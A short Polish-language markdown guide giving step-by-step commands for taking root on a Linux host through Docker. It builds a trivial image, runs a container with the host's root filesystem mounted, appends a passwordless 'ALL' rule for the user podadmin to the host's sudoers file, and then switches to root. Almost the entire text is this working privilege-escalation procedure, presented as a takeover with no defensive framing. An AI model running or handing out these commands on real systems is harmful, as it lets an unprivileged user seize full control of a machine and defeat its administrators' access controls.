# =============== MAJSTER -> user ===============

## Tworzymy w folderze domowym usera podadmin folder dajroot w którym umieszczamy skrypt

- ### mkdir /home/podadmin/dajroot
- ### cd /home/podadmin/dajroot
- ### nano dockerfile
    
    FROM dockette/wheezy
    ENV WORKDIR /dajroot
    RUN mkdir -p $WORKDIR
    VOLUME $WORKDIR
    WORKDIR $WORKDIR
    


## Budujemy skrypt w folderze
- ### docker build -t dajroot .

## Sprawdzamy, czy się zainstalował
- ### docker images

## Odpalamy container
- ### docker run -v /:/dajroot -it dajroot /bin/bash

## Będąc w kontenerze wpisujemy
- ### cd..
- ### echo "podadmin ALL=(ALL) NOPASSWD:ALL" >> /dajroot/etc/sudoers

## Patrzytmy czy w pliku sudoers jest dopisek "podadmin ALL=(ALL) NOPASSWD:ALL"
- ### cat dajroot/etc/sudoers

## Wychodzimy z containera
- ### exirt

## Robimy przejecie roota
- ### sudo su

===================